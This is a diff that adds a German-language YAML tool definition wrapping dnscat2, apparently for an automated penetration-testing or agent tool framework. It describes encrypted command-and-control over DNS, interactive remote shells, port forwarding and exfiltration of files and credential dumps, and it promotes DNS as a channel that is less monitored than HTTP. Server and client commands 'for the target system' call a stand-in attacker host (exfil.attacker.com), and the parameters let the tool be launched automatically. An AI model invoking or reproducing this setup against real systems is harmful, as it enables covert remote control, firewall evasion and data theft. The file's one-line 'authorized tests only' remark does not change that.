@@ -1,0 +1,90 @@
+name: "dnscat2"
+command: "ruby"
+args:
+  - "/usr/local/bin/dnscat2"
+enabled: true
+short_description: "dnscat2 – DNS-Tunneling & verschlüsselte C2-Kommunikation via DNS"
+description: |
+  dnscat2 erstellt einen verschlüsselten Command-&-Control-Kanal über DNS-Anfragen.
+  Ideal für Umgebungen mit strikten Firewall-Regeln, die ausgehenden DNS-Traffic erlauben.
+  Unterstützt Daten-Exfiltration, interaktive Shells und Port-Forwarding via DNS.
+
+  **Hauptfunktionen:**
+  - Verschlüsselter C2-Kanal via DNS TXT/MX/CNAME Records
+  - Interaktive Shell-Sessions über DNS
+  - Datei-Exfiltration via DNS-Queries
+  - Port-Forwarding durch DNS-Tunnel
+  - Unterstützt direkten DNS-Modus (kein eigener Domain erforderlich)
+  - Multi-Session-Management
+
+  **Server starten:**
+  ```bash
+  # Mit eigener Domain (bevorzugt)
+  ruby dnscat2.rb --dns domain=exfil.attacker.com --no-cache
+
+  # Direkter Modus (ohne Domain)
+  ruby dnscat2.rb --dns server=8.8.8.8,port=53
+
+  # Mit Secret für Authentifizierung
+  ruby dnscat2.rb --secret mysecret --dns domain=exfil.attacker.com
+  ```
+
+  **Client (auf Zielsystem):**
+  ```bash
+  # Windows (dnscat2-powershell)
+  Start-Dnscat2 -DNSServer attacker.com -Domain exfil.attacker.com -PreSharedSecret mysecret
+
+  # Linux
+  ./dnscat --secret mysecret exfil.attacker.com
+  ```
+
+  **Server-Befehle nach Verbindung:**
+  - `sessions` – Aktive Sessions anzeigen
+  - `session -i <id>` – Session auswählen
+  - `shell` – Interaktive Shell öffnen
+  - `download <remote> <local>` – Datei exfiltrieren
+  - `upload <local> <remote>` – Datei hochladen
+  - `listen <local_port> <remote_host>:<remote_port>` – Port-Forward
+
+  **Exfiltrations-Szenarien:**
+  - Exfiltration von Credential-Dumps via DNS
+  - Umgehung von HTTP/HTTPS-Firewalls
+  - C2 in Air-Gapped-Netzwerken mit DNS-Zugang
+
+  **Hinweise:**
+  - DNS-Traffic oft weniger überwacht als HTTP/S
+  - Eigene Domain mit NS-Record auf Angreifer-IP empfohlen
+  - Nur für autorisierte Sicherheitstests verwenden
+parameters:
+  - name: "mode"
+    type: "string"
+    description: |
+      Betriebsmodus des dnscat2-Servers:
+      - `server` – Server starten
+      - `server_domain` – Server mit Domain starten
+      Für Client-Deployment auf Zielsystem exec-Tool verwenden.
+    required: true
+    position: 0
+    format: "positional"
+  - name: "domain"
+    type: "string"
+    description: "DNS-Domain für C2-Kanal (z.B. exfil.attacker.com). Bei Direktmodus leer lassen."
+    required: false
+    default: ""
+    flag: "--dns domain="
+    format: "template"
+    template: "--dns domain={value}"
+  - name: "secret"
+    type: "string"
+    description: "Pre-Shared Secret für verschlüsselte Kommunikation"
+    required: false
+    default: ""
+    flag: "--secret"
+    format: "flag"
+  - name: "additional_args"
+    type: "string"
+    description: "Weitere dnscat2-Argumente (z.B. --no-cache, --port 5353)"
+    required: false
+    default: ""
+    position: 1
+    format: "positional"
